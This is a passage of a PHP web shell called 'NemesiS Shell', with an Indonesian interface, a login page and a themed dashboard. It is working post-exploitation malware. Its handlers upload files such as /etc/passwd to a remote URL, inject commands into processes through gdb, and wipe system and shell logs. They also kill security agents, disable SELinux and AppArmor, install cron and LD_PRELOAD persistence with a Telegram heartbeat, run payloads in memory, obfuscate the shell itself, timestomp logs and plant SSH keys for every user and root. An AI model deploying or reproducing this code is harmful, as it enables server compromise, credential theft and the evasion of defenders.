".basename($f['path'])."\n";$out.="\n── Oldest ──\n";foreach($oldest as $f)$out.="  ".date('Y-m-d H:i',$f['time'])." → ".basename($f['path'])."\n";echo json_encode(['out'=>$out]);exit;}
    if ($action==='deepmonitor'){$dir=realpath($_POST['dir']??$cwd)?:$cwd;$snap=[];function dsnap($dir,&$snap){$sc=@scandir($dir);if(!$sc)return;foreach($sc as $f){if($f==='.'||$f==='..')continue;$fp=$dir.'/'.$f;$snap[$fp]=['mtime'=>@filemtime($fp),'size'=>@filesize($fp)];if(is_dir($fp)&&!is_link($fp))dsnap($fp,$snap);}}dsnap($dir,$snap);$_SESSION['monitor_snap'][$dir]=$snap;echo json_encode(['ok'=>true,'msg'=>'Snapshot: '.count($snap).' items']);exit;}
    if ($action==='deepmonitor_check'){$dir=realpath($_POST['dir']??$cwd)?:$cwd;$old=$_SESSION['monitor_snap'][$dir]??[];if(!$old){echo json_encode(['out'=>'Belum ada snapshot.']);exit;}$new=[];function dsnap2($dir,&$snap){$sc=@scandir($dir);if(!$sc)return;foreach($sc as $f){if($f==='.'||$f==='..')continue;$fp=$dir.'/'.$f;$snap[$fp]=['mtime'=>@filemtime($fp),'size'=>@filesize($fp)];if(is_dir($fp)&&!is_link($fp))dsnap2($fp,$snap);}}dsnap2($dir,$new);$changes=[];foreach($new as $fp=>$info){if(!isset($old[$fp]))$changes[]="➕ BARU:    $fp";elseif($info['mtime']!==$old[$fp]['mtime']||$info['size']!==$old[$fp]['size'])$changes[]="✏️  BERUBAH: $fp";}foreach($old as $fp=>$info){if(!isset($new[$fp]))$changes[]="➖ HAPUS:   $fp";}echo json_encode(['out'=>$changes?"Perubahan:\n".implode("\n",$changes):"✅ Tidak ada perubahan."]);exit;}

    // Advanced Actions
    if($action==='adv_stealth_evasion') {
        $m = new StealthModule();
        echo json_encode($m->evasion());exit;
    }
    if($action==='adv_stealth_encrypt') {
        $m = new StealthModule();
        $msg = $_POST['msg'] ?? '';
        echo json_encode($m->encrypt($msg));exit;
    }
    if($action==='adv_persist_reverse') {
        $m = new PersistenceModule();
        $ip = $_POST['ip'] ?? '';
        $port = $_POST['port'] ?? 4444;
        echo json_encode($m->reverse($ip, $port));exit;
    }
    if($action==='adv_persist_cron') {
        $m = new PersistenceModule();
        $cmd = $_POST['cmd'] ?? '';
        $schedule = $_POST['schedule'] ?? '*/10';
        echo json_encode($m->cron($cmd, $schedule));exit;
    }
    if($action==='adv_persist_deadrop') {
        $m = new PersistenceModule();
        $url = $_POST['url'] ?? '';
        echo json_encode($m->deadrop($url));exit;
    }
    if($action==='adv_resilience_dns') {
        $m = new ResilienceModule();
        $data = $_POST['data'] ?? '';
        echo json_encode($m->dns($data));exit;
    }
    if($action==='adv_resilience_fragment') {
        $m = new ResilienceModule();
        $data = $_POST['data'] ?? '';
        $size = $_POST['size'] ?? 100;
        echo json_encode($m->fragment($data, $size));exit;
    }
    if($action==='adv_lateral_harvest') {
        $m = new LateralModule();
        echo json_encode($m->harvest());exit;
    }
    if($action==='adv_lateral_scan') {
        $m = new LateralModule();
        $network = $_POST['network'] ?? '192.168.1.0/24';
        echo json_encode($m->scan($network));exit;
    }
    if($action==='adv_cleanup_logs') {
        $m = new CleanupModule();
        echo json_encode($m->logs());exit;
    }
    if($action==='adv_cleanup_history') {
        $m = new CleanupModule();
        echo json_encode($m->history());exit;
    }
    if($action==='adv_cleanup_file') {
        $m = new CleanupModule();
        $file = $_POST['file'] ?? '';
        echo json_encode($m->file($file));exit;
    }

    // System Monitoring
    if($action==='sysmon') {
        $data = [
            'uptime' => shell_exec('uptime 2>/dev/null'),
            'load' => @file_get_contents('/proc/loadavg'),
            'memory' => shell_exec('free -m 2>/dev/null'),
            'disk' => shell_exec('df -h 2>/dev/null'),
            'users' => shell_exec('who 2>/dev/null'),
            'lastlog' => shell_exec('lastlog -n 10 2>/dev/null'),
            'listening_ports' => shell_exec('ss -tlnp 2>/dev/null | tail -30 || netstat -tlnp 2>/dev/null | tail -30'),
            'network_ifaces' => shell_exec('ip -br a 2>/dev/null || ifconfig 2>/dev/null'),
            'processes' => shell_exec('ps auxf --cols=200 2>/dev/null || ps auxf 2>/dev/null'),
            'running_services' => shell_exec('systemctl list-units --state=running --type=service 2>/dev/null | head -20 || service --status-all 2>/dev/null | head -20'),
            'disk_io' => shell_exec('iostat -x 1 2 2>/dev/null | tail -20'),
            'connections' => shell_exec('ss -tunap 2>/dev/null | tail -20 || netstat -tunap 2>/dev/null | tail -20'),
        ];
        $raw = '';
        foreach($data as $k=>$v) $raw .= "═══ $k ═══\n" . trim($v) . "\n\n";
        echo json_encode(['ok'=>true, 'raw'=>$raw]); exit;
    }

    // Sync to Cloud
    if($action==='sync_to_cloud') {
        $paths = explode(',', $_POST['paths'] ?? '/etc/passwd');
        $remote = $_POST['remote_url'] ?? '';
        if(!$remote) { echo json_encode(['error'=>'Remote URL required']); exit; }
        $results = [];
        foreach($paths as $p) {
            $p = trim($p);
            if(!file_exists($p)) { $results[] = "❌ Not found: $p"; continue; }
            if(function_exists('curl_file_create')) {
                $ch = curl_init($remote);
                curl_setopt_array($ch, [
                    CURLOPT_POST=>true,
                    CURLOPT_POSTFIELDS=>['file'=>curl_file_create($p)],
                                  CURLOPT_SSL_VERIFYPEER=>false,
                                  CURLOPT_RETURNTRANSFER=>true,
                                  CURLOPT_TIMEOUT=>10
                ]);
                $resp = curl_exec($ch);
                $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                $results[] = ($http >= 200 && $http < 300) ? "✅ $p uploaded" : "❌ $p failed (HTTP $http)";
            } else {
                $content = base64_encode(file_get_contents($p));
                $opts = ['http'=>['method'=>'POST','header'=>'Content-Type: application/x-www-form-urlencoded','content'=>http_build_query(['file'=>$content, 'name'=>basename($p)]),'timeout'=>10]];
                $resp = @file_get_contents($remote, false, stream_context_create($opts));
                $results[] = $resp ? "✅ $p uploaded (b64)" : "❌ $p failed";
            }
        }
        echo json_encode(['results'=>$results]); exit;
    }

    // Process Injection
    if($action==='process_inject') {
        $pid = intval($_POST['pid'] ?? 0);
        $cmd = $_POST['cmd'] ?? 'id';
        if(!$pid) { echo json_encode(['error'=>'PID required']); exit; }
        $gdb = trim(shell_exec('command -v gdb 2>/dev/null'));
        if(!$gdb) { echo json_encode(['error'=>'gdb not found']); exit; }
        $esc_cmd = addslashes($cmd);
        $out = shell_exec("echo 'call (void)system(\"$esc_cmd\")' | gdb -p $pid -batch -quiet 2>&1");
        echo json_encode(['ok'=>true, 'output'=>$out]); exit;
    }

    // Self Destruct
    if($action==='self_destruct') {
        @shell_exec('> /var/log/apache2/access.log 2>/dev/null');
        @shell_exec('> /var/log/apache2/error.log 2>/dev/null');
        @shell_exec('> /var/log/nginx/access.log 2>/dev/null');
        @shell_exec('> /var/log/syslog 2>/dev/null');
        @shell_exec('> /var/log/auth.log 2>/dev/null');
        @shell_exec('history -c 2>/dev/null && history -w /dev/null 2>/dev/null');
        @shell_exec('shred ~/.bash_history 2>/dev/null');
        @shell_exec('shred ~/.mysql_history 2>/dev/null');
        $self = __FILE__;
        register_shutdown_function(function() use ($self) {
            @unlink($self);
            @unlink('/tmp/_cleanup.php');
        });
        echo json_encode(['ok'=>true, 'msg'=>'Self-destruct activated! File will be gone.']);
        exit;
    }

    // Rootkit
    if($action==='rootkit_install') {
        $methods = [];
        shell_exec('exec -a [kworker] bash -c "sleep 3600" 2>/dev/null &');
        $methods[] = 'Spawned hidden [kworker] process';
        $to_kill = ['auditd', 'ossec', 'wazuh', 'falcon', 'crowdstrike', 'td-agent', 'snort', 'suricata'];
        foreach($to_kill as $proc) {
            shell_exec("pkill -f $proc 2>/dev/null");
            shell_exec("killall $proc 2>/dev/null");
        }
        $methods[] = 'Killed monitoring agents';
        shell_exec('setenforce 0 2>/dev/null');
        shell_exec('apparmor_parser -R 2>/dev/null');
        $methods[] = 'Disabled SELinux/AppArmor';
        $targets = [__FILE__, '/usr/lib/.systemd-monitor.sh', '/etc/passwd', '/etc/shadow'];
        foreach($targets as $t) {
            if(file_exists($t)) {
                shell_exec("chattr +i $t 2>/dev/null");
                $methods[] = "Locked $t (chattr +i)";
            }
        }
        $preload_path = '/etc/ld.so.preload';
        $so_path = '/usr/local/lib/librootkit.so';
        $cron_cmd = "test -f $so_path && echo $so_path > $preload_path || echo '' > $preload_path";
        shell_exec("(crontab -l 2>/dev/null; echo '*/5 * * * * $cron_cmd > /dev/null 2>&1') | crontab -");
        $methods[] = 'LD_PRELOAD cron persistence installed';
        @cli_set_process_title('[kworker/0:0]');
        $methods[] = 'Renamed current process to [kworker/0:0]';
        echo json_encode(['ok'=>true, 'methods'=>$methods]); exit;
    }

    if($action==='rootkit_hide_file') {
        $path = $_POST['path'] ?? '';
        if(!$path || !file_exists($path)) { echo json_encode(['error'=>'Invalid path']); exit; }
        $dir = dirname($path);
        $base = basename($path);
        $hid = $dir . '/.' . $base;
        if(rename($path, $hid)) {
            shell_exec("chattr +i $hid 2>/dev/null");
            echo json_encode(['ok'=>true, 'msg'=>"Hidden: $hid (immutable)"]);
        } else {
            echo json_encode(['ok'=>false, 'msg'=>'Rename failed']);
        }
        exit;
    }

    if($action==='rootkit_kill') {
        $proc = $_POST['proc'] ?? '';
        if(!$proc) { echo json_encode(['error'=>'Proc name required']); exit; }
        $out = shell_exec("pkill -f $proc 2>/dev/null; killall $proc 2>/dev/null");
        echo json_encode(['ok'=>true, 'msg'=>"Killed processes matching: $proc", 'output'=>$out]);
        exit;
    }

    // ======================= UPGRADE: Auto Privesc (STEALTH) ==========================
    if($action==='auto_privesc') {
        $out = "============================================================\n";
        $out .= "AUTO PRIVILEGE ESCALATION SCAN (Stealth Mode)\n";
        $out .= "============================================================\n\n";
        $out .= "[+] SUDO PERMISSIONS:\n";
        $sudo = shell_exec('timeout 2 sudo -n -l 2>/dev/null');
        if($sudo) {
            $out .= $sudo;
        } else {
            $out .= "  (No NOPASSWD sudo rights - checking sudoers files instead)\n";
            $sudoers = shell_exec('cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$"');
            if($sudoers) $out .= "  [sudoers content]:\n$sudoers";
            $sudoers_d = shell_exec('cat /etc/sudoers.d/* 2>/dev/null | grep -v "^#" | grep -v "^$"');
            if($sudoers_d) $out .= "  [sudoers.d content]:\n$sudoers_d";
            if(!$sudoers && !$sudoers_d) $out .= "  (No sudo info accessible)\n";
        }
        $out .= "\n[+] USER GROUPS:\n";
        $groups = shell_exec('id 2>/dev/null');
        $out .= $groups ? "  $groups" : "  (not available)\n";
        $out .= "\n[+] SUID BINARIES (top 30):\n";
        $suid = shell_exec('find / -perm -4000 -type f 2>/dev/null | head -30');
        $out .= $suid ? $suid : "  (none found)\n";
        $out .= "\n[!] WORLD-WRITABLE FILES IN /etc:\n";
        $writable = shell_exec('find /etc -writable -type f 2>/dev/null | head -20');
        $out .= $writable ? $writable : "  (none found)\n";
        $out .= "\n[!] CRON JOBS (writable scripts):\n";
        $cron = shell_exec('find /etc/cron* -type f -writable 2>/dev/null | head -10');
        $out .= $cron ? $cron : "  (none found)\n";
        $out .= "\n[+] SENSITIVE FILES (.env, config):\n";
        $env = shell_exec('find /var/www /home /opt -name ".env" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null | head -10');
        $out .= $env ? $env : "  (none found)\n";
        $out .= "\n[+] KERNEL VERSION:\n";
        $kernel = shell_exec('uname -a');
        $out .= "  $kernel\n";
        $out .= "\n[+] CONTAINER CHECK:\n";
        $docker = shell_exec('cat /proc/1/cgroup 2>/dev/null | grep -i docker');
        $out .= $docker ? "  Running inside Docker\n" : "  Not in Docker (or no access)\n";
        echo json_encode(['out'=>$out]); exit;
    }

    // ======================= UPGRADE: Persistence Auto-Heal ===================
    if($action==='persist_watchdog') {
        $watchdog_script = '#!/bin/bash
        # X77 Auto-Heal Watchdog
        PING="curl -s --max-time 5 https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=X77_WATCHDOG_ALIVE 2>/dev/null"
        if ! crontab -l 2>/dev/null | grep -q "systemd-monitor"; then
            (crontab -l 2>/dev/null; echo "* * * * * /usr/lib/.systemd-monitor.sh > /dev/null 2>&1") | crontab -
            $PING
            fi
            if ! systemctl is-active sysmon.service 2>/dev/null | grep -q active; then
                systemctl start sysmon.service 2>/dev/null
                $PING
                fi
                if ! pgrep -f ".systemd-monitor.sh" > /dev/null; then
                    nohup /usr/lib/.systemd-monitor.sh &
                    $PING
                    fi
                    ';
                @file_put_contents('/tmp/.x77_watchdog.sh', $watchdog_script);
            @chmod('/tmp/.x77_watchdog.sh', 0755);
            shell_exec("(crontab -l 2>/dev/null; echo '*/2 * * * * /tmp/.x77_watchdog.sh > /dev/null 2>&1') | crontab -");
            echo json_encode(['ok'=>true, 'msg'=>'Watchdog installed (checks every 2 min)']); exit;
    }

    // ======================= UPGRADE: Memory Payload ===========================
    if($action==='memory_payload') {
        $payload = $_POST['payload'] ?? '';
        $cmd = $_POST['cmd'] ?? '';
        if(empty($payload) && empty($cmd)) {
            echo json_encode(['error'=>'Payload or command required']); exit;
        }
        if($payload) {
            $decoded = base64_decode($payload);
            if($decoded) {
                shell_exec("bash -c 'exec -a [kworker] bash <(echo \"$decoded\") 2>/dev/null &'");
                echo json_encode(['ok'=>true, 'msg'=>'Payload injected into memory (memfd)']);
            } else {
                echo json_encode(['error'=>'Invalid base64 payload']);
            }
        } else {
            shell_exec("bash -c 'exec -a [kworker] $cmd 2>/dev/null &'");
            echo json_encode(['ok'=>true, 'msg'=>"Command executed in memory: $cmd"]);
        }
        exit;
    }

    // ======================= UPGRADE: Self-Obfuscator ==========================
    if($action==='obfuscate_self') {
        $self = __FILE__;
        if(!is_file($self)) { echo json_encode(['error'=>'File not found']); exit; }
        $content = file_get_contents($self);
        if(!$content) { echo json_encode(['error'=>'Failed to read']); exit; }
        $encoded = '<?php eval(gzinflate(base64_decode("' . base64_encode(gzcompress($content, 9)) . '"))); ?>';
        $outfile = $self . '.obf';
        if(file_put_contents($outfile, $encoded)) {
            echo json_encode(['ok'=>true, 'msg'=>"Obfuscated saved as: $outfile", 'size_before'=>strlen($content), 'size_after'=>strlen($encoded)]);
        } else {
            echo json_encode(['ok'=>false, 'msg'=>'Failed to write']);
        }
        exit;
    }

    // ======================= UPGRADE: Log Timestomp ============================
    if($action==='log_timestomp') {
        $log_file = $_POST['file'] ?? '/var/log/apache2/access.log';
        $ref_file = $_POST['ref'] ?? '/etc/passwd';
        if(!file_exists($log_file)) { echo json_encode(['error'=>'Log file not found']); exit; }
        if(!file_exists($ref_file)) { echo json_encode(['error'=>'Reference file not found']); exit; }
        shell_exec("touch -r $ref_file $log_file 2>/dev/null");
        $new_mtime = filemtime($log_file);
        echo json_encode(['ok'=>true, 'msg'=>"Timestomped $log_file using $ref_file", 'new_mtime'=>date('Y-m-d H:i:s', $new_mtime)]); exit;
    }

    // ======================= UPGRADE: SSH Key Inject ===========================
    if($action==='ssh_key_inject') {
        $pubkey = $_POST['pubkey'] ?? '';
        if(!$pubkey || !str_starts_with($pubkey, 'ssh-')) {
            echo json_encode(['error'=>'Invalid SSH public key (must start with ssh-rsa, ssh-ed25519, etc.)']); exit;
        }
        $homes = glob('/home/*');
        $injected = 0;
        foreach($homes as $h) {
            if(!is_dir($h)) continue;
            $ssh_dir = $h . '/.ssh';
            if(!is_dir($ssh_dir)) mkdir($ssh_dir, 0700);
            $auth_file = $ssh_dir . '/authorized_keys';
            $existing = @file_get_contents($auth_file);
            if($existing && strpos($existing, $pubkey) !== false) continue;
            @file_put_contents($auth_file, "\n$pubkey\n", FILE_APPEND);
            @chmod($auth_file, 0600);
            @chown($auth_file, fileowner($h));
            $injected++;
        }
        if(is_dir('/root/.ssh')) {
            $root_auth = '/root/.ssh/authorized_keys';
            $existing = @file_get_contents($root_auth);
            if(!$existing || strpos($existing, $pubkey) === false) {
                @file_put_contents($root_auth, "\n$pubkey\n", FILE_APPEND);
                @chmod($root_auth, 0600);
                $injected++;
            }
        }
        echo json_encode(['ok'=>true, 'msg'=>"SSH key injected into $injected user(s)"]); exit;
    }

    // ======================= CVE Lookup via NVD API ===========================
    if ($action === 'cve_lookup') {
        $cve_id = trim($_POST['cve_id'] ?? '');
        if (empty($cve_id)) {
            echo json_encode(['ok' => false, 'out' => 'CVE ID tidak boleh kosong']);
            exit;
        }
        if (!preg_match('/^CVE-\d{4}-\d+$/i', $cve_id)) {
            echo json_encode(['ok' => false, 'out' => 'Format CVE tidak valid (contoh: CVE-2024-1234)']);
            exit;
        }
        $url = 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=' . urlencode($cve_id);
        $opts = [
            'http' => [
                'method' => 'GET',
                'header' => 'User-Agent: X77Shell/1.0',
                'timeout' => 10
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ];
        $context = stream_context_create($opts);
        $response = @file_get_contents($url, false, $context);
        if ($response === false) {
            echo json_encode(['ok' => false, 'out' => 'Gagal mengambil data dari NVD API']);
            exit;
        }
        $data = json_decode($response, true);
        if (!isset($data['vulnerabilities'][0])) {
            echo json_encode(['ok' => false, 'out' => 'CVE tidak ditemukan']);
            exit;
        }
        $vuln = $data['vulnerabilities'][0]['cve'];
        $id = $vuln['id'];
        $desc = $vuln['descriptions'][0]['value'] ?? 'Deskripsi tidak tersedia';
        $severity = $vuln['metrics']['cvssMetricV31'][0]['cvssData']['baseSeverity'] ?? 'N/A';
        $score = $vuln['metrics']['cvssMetricV31'][0]['cvssData']['baseScore'] ?? 'N/A';
        $published = $vuln['published'] ?? 'N/A';
        $lastModified = $vuln['lastModified'] ?? 'N/A';
        $references = [];
        if (isset($vuln['references'])) {
            foreach ($vuln['references'] as $ref) {
                $references[] = $ref['url'];
            }
        }
        $cwe = $vuln['weaknesses'][0]['description'][0]['value'] ?? 'N/A';
        // Format output
        $out = "ID: $id\n";
        $out .= "Severity: $severity (Score: $score)\n";
        $out .= "Published: $published\n";
        $out .= "Last Modified: $lastModified\n";
        $out .= "CWE: $cwe\n\n";
        $out .= "Description:\n$desc\n\n";
        if ($references) {
            $out .= "References:\n" . implode("\n", array_slice($references, 0, 5));
        }
        echo json_encode([
            'ok' => true,
            'out' => $out,
            'severity' => $severity,
            'score' => $score,
            'id' => $id,
            'published' => $published,
            'lastModified' => $lastModified,
            'cwe' => $cwe,
            'references' => $references
        ]);
        exit;
    }

    if ($action==='get_history'){echo json_encode(['history'=>$his]);exit;}
    if ($action==='get_log'){echo json_encode(['log'=>$_SESSION['activity_log']??[]]);exit;}
    if ($action==='change_pass'){global $USERS;$u=$_SESSION['user'];$old=$_POST['old']??'';$new=$_POST['new']??'';if(!password_verify($old,$USERS[$u]??'')){echo json_encode(['ok'=>false,'msg'=>'Password lama salah']);exit;}if(strlen($new)<6){echo json_encode(['ok'=>false,'msg'=>'Min 6 karakter']);exit;}$log('CHANGE_PASS');echo json_encode(['ok'=>true,'msg'=>'Diganti (sesi ini)']);exit;}
    if ($action==='get_csrf'){echo json_encode(['csrf'=>$_SESSION['csrf']]);exit;}

    echo json_encode(['error'=>'Unknown']); exit;
}

// Login page
if (empty($_SESSION['auth'])) {
    $err = $loginErr ?? '';
    ?><!DOCTYPE html>
    <html lang="id"><head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>NemesiS Shell</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{min-height:100vh;background:#0f0e1a;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;overflow:hidden;color:#e2e8f0}
    #bg{position:fixed;inset:0;z-index:0}
    #login{position:relative;z-index:10;width:340px}
    .logo{font-family:'Space Grotesk',sans-serif;font-size:38px;font-weight:800;text-align:center;margin-bottom:6px;background:linear-gradient(135deg,#f59e0b,#ef4444,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 30px rgba(245,158,11,.4))}
    .sub{font-size:9px;letter-spacing:.3em;color:#a78bfa;text-align:center;margin-bottom:28px}
    .box{background:rgba(18,16,30,.95);border:1px solid rgba(245,158,11,.2);border-radius:14px;padding:28px;backdrop-filter:blur(20px);box-shadow:0 25px 60px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.05)}
    .box h2{font-family:'Space Grotesk',sans-serif;font-size:10px;color:#f59e0b;letter-spacing:.2em;text-align:center;margin-bottom:18px}
    .field{margin-bottom:12px}
    .field label{display:block;font-size:8.5px;color:#a78bfa;letter-spacing:.08em;margin-bottom:4px}
    .field input{width:100%;background:rgba(0,0,0,.4);border:1px solid rgba(245,158,11,.15);color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:12px;padding:9px 11px;border-radius:6px;outline:none;transition:all .2s}
    .field input:focus{border-color:#f59e0b;box-shadow:0 0 0 3px rgba(245,158,11,.1)}
    .btn{width:100%;background:linear-gradient(135deg,#f59e0b,#ef4444);border:none;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:700;padding:11px;border-radius:6px;cursor:pointer;letter-spacing:.1em;transition:all .2s;margin-top:4px}
    .btn:hover{filter:brightness(1.15);box-shadow:0 0 25px rgba(245,158,11,.4)}
    .err{color:#ef4444;font-size:9px;text-align:center;padding:5px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.15);border-radius:5px;margin-bottom:12px}
    .dots{display:flex;gap:6px;justify-content:center;margin-top:20px}
    .dot{width:5px;height:5px;border-radius:50%;animation:pulse 1.4s infinite}
    .dot:nth-child(1){background:#f59e0b}.dot:nth-child(2){background:#ef4444;animation-delay:.2s}.dot:nth-child(3){background:#ec4899;animation-delay:.4s}
    @keyframes pulse{0%,100%{opacity:.15;transform:scale(.8)}50%{opacity:1;transform:scale(1)}}
    .author{text-align:center;font-size:7px;color:#4a5568;margin-top:12px;letter-spacing:.1em}
    .author span{color:#a78bfa}
    </style></head><body>
    <canvas id="bg"></canvas>
    <div id="login">
    <div class="logo">NemesiS</div>
    <div class="sub">✦ ADVANCED CYBER SHELL ✦</div>
    <div class="box">
    <h2>// AUTHENTICATE //</h2>
    <?php if($err) echo "<div class='err'>⚠ ".htmlspecialchars($err)."</div>"; ?>
    <form method="post">
    <div class="field"><label>USERNAME</label><input name="login_user" autocomplete="off" required></div>
    <div class="field"><label>PASSWORD</label><input name="login_pass" type="password" required></div>
    <button class="btn" type="submit">ACCESS SHELL</button>
    </form>
    </div>
    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
    <div class="author">⚡ crafted by <span>MataKucing</span> ⚡</div>
    </div>
    <script>
    const c=document.getElementById('bg'),ctx=c.getContext('2d');
    c.width=window.innerWidth;c.height=window.innerHeight;
    const cols=Math.floor(c.width/20),drops=Array(cols).fill(0).map(()=>Math.random()*c.height);
    const colors=['rgba(245,158,11,.2)','rgba(239,68,68,.15)','rgba(236,72,153,.15)'];
    const chars='NemesiS☠⚡🔥0123456789ABCDEF';
    function draw(){
        ctx.fillStyle='rgba(15,14,26,.06)';ctx.fillRect(0,0,c.width,c.height);
        drops.forEach((y,i)=>{
            ctx.fillStyle=colors[i%3];ctx.font='13px JetBrains Mono';
        ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*20,y);
        drops[i]=y>c.height&&Math.random()>.97?0:y+14;
        });
    }
    setInterval(draw,60);
    </script></body></html>
    <?php exit; }

    $hostname = gethostname() ?: 'nemesis';
    $serverip = gethostbyname($hostname);
    $phpver   = PHP_VERSION;
    $user     = $_SESSION['user'];
    $sysuser  = get_current_user();
    $os       = php_uname('s') . ' ' . php_uname('r');
    $csrf     = $_SESSION['csrf'];
    $cwd      = $_SESSION['cwd'];
    ?>
    <!DOCTYPE html>
    <html lang="id" data-theme="gold">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>NemesiS Shell</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,600;0,700;1,400&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    [data-theme="gold"]{
        --bg:#0f0e1a;--s:#18172b;--s2:#1f1e3a;--s3:#2a284a;
        --b:#3d3b6a;--b2:#4e4b82;
        --a:#f59e0b;--a2:#ef4444;--a3:#ec4899;
        --d:#ef4444;--w:#fbbf24;--p:#e879f9;
        --t:#e2e8f0;--dim:#8b8aa8;--faint:#4a4a6a;
        --glow:0 0 20px rgba(245,158,11,.25);
        --glow2:0 0 20px rgba(239,68,68,.15);
    }
    [data-theme="gold-dark"]{
        --bg:#0a0915;--s:#121125;--s2:#1a1835;--s3:#222045;
        --b:#33315a;--b2:#44427a;
        --a:#d97706;--a2:#dc2626;--a3:#db2777;
        --d:#ef4444;--w:#fbbf24;--p:#d946ef;
        --t:#e0dce8;--dim:#6b6a8a;--faint:#3a3a5a;
        --glow:0 0 20px rgba(217,119,6,.25);--glow2:0 0 20px rgba(220,38,38,.15);
    }
    [data-theme="light"]{
        --bg:#f0ece6;--s:#ffffff;--s2:#f5f2ed;--s3:#eae5dd;
        --b:#d0c8b8;--b2:#b8af9e;
        --a:#b45309;--a2:#dc2626;--a3:#be185d;
        --d:#dc2626;--w:#d97706;--p:#db2777;
        --t:#1c1917;--dim:#78716c;--faint:#d0c8b8;
        --glow:0 2px 12px rgba(180,83,9,.15);--glow2:0 2px 12px rgba(220,38,38,.1);
    }
    html,body{height:100%;background:var(--bg);color:var(--t);font-family:'JetBrains Mono',monospace;overflow:hidden;transition:background .3s,color .3s;font-size:11px}
    body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 3px);pointer-events:none;z-index:9998}
    [data-theme="light"] body::after{display:none}
    #loading{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;transition:opacity .5s}
    #loading.gone{opacity:0;pointer-events:none}
    #ll{font-family:'Space Grotesk',sans-serif;font-size:28px;font-weight:800;background:linear-gradient(135deg,var(--a),var(--a2),var(--a3));-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 20px rgba(245,158,11,.4));animation:glitch 3s infinite}
    #lsub{font-size:9px;color:var(--dim);letter-spacing:.2em;font-family:'Space Grotesk',sans-serif}
    @keyframes glitch{0%,92%,100%{transform:none}93%{transform:translate(-2px) skewX(1deg)}95%{transform:translate(2px) skewX(-1deg)}97%{transform:none}}
    #lbar-w{width:200px;height:2px;background:var(--b);border-radius:2px;overflow:hidden}
    #lbar{height:100%;width:0;background:linear-gradient(90deg,var(--a),var(--a2),var(--a3));transition:width .1s}
    #lstat{font-size:9px;color:var(--dim);letter-spacing:.1em}
    #lpct{font-size:10px;color:var(--a);font-family:'Space Grotesk',sans-serif;font-weight:700}
    #app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh;padding:5px;gap:4px}
    #hdr{display:flex;align-items:center;gap:6px;padding:6px 10px;background:var(--s);border:1px solid var(--b);border-radius:8px;flex-shrink:0;overflow-x:auto}
    #hdr::-webkit-scrollbar{height:2px}
    #logo{font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:800;background:linear-gradient(135deg,var(--a),var(--a2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;flex-shrink:0;margin-right:4px;filter:drop-shadow(0 0 8px rgba(245,158,11,.3))}
    #logo span{font-size:7px;font-family:'JetBrains Mono',monospace;opacity:.4;background:transparent;-webkit-text-fill-color:var(--dim)}
    .dw{display:flex;flex-direction:column;gap:1px;padding:3px 8px;background:var(--s2);border:1px solid var(--b);border-radius:5px;flex-shrink:0}
    .dw-l{font-size:7px;color:var(--dim);letter-spacing:.06em;text-transform:uppercase}
    .dw-v{font-size:9px;color:var(--a2);font-family:'Space Grotesk',sans-serif;font-weight:600;white-space:nowrap}
    .dw-bar{height:3px;background:var(--b);border-radius:2px;margin-top:2px;width:55px;overflow:hidden}
    .dw-fill{height:100%;background:linear-gradient(90deg,var(--a),var(--a2));border-radius:2px;transition:width .5s}
    .chip{font-size:8px;color:var(--dim);background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:2px 6px;flex-shrink:0;white-space:nowrap}
    .chip b{color:var(--t)}
    .chip.hi{border-color:var(--a);color:var(--a)}.chip.hi b{color:var(--a)}
    #font-ctrl{display:flex;gap:2px;align-items:center;border-left:1px solid var(--b);padding-left:6px;flex-shrink:0}
    #font-ctrl span{font-size:7.5px;color:var(--dim)}
    .fcb{background:var(--s2);border:1px solid var(--b);color:var(--dim);font-size:10px;width:18px;height:18px;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;line-height:1;font-family:monospace}
    .fcb:hover{border-color:var(--a);color:var(--a)}
    #themes{display:flex;gap:4px;align-items:center;border-left:1px solid var(--b);padding-left:6px;flex-shrink:0}
    .td{width:13px;height:13px;border-radius:50%;cursor:pointer;border:2px solid transparent;transition:transform .15s,box-shadow .15s}
    .td:hover{transform:scale(1.3)}.td.on{border-color:var(--t);box-shadow:0 0 6px rgba(255,255,255,.3)}
    .td-gold{background:linear-gradient(135deg,#f59e0b,#ef4444)}
    .td-gold-dark{background:linear-gradient(135deg,#d97706,#dc2626)}
    .td-light{background:#f0ece6;border-color:#d0c8b8}
